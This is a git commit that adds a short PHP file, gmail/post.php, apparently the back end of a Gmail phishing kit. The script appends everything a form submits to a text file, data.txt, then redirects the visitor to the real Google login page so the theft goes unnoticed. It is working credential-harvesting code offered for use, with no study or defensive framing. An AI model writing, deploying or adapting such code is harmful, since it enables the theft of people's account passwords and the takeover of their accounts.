1201517ba894393a79cf720a743981e8bd750956
mak <makindosx@gmail.com>
2017-05-27 01:51:03 +0300

    Add files via upload

---
+++ gmail/post.php
@@ -0,0 +1,4 @@
+<?php $file = "data.txt";
+file_put_contents($file, print_r($_POST, true), FILE_APPEND);
+?>
+<meta http-equiv="refresh" content="0; url=https://accounts.google.com/Login?hl=el#identifier"/>
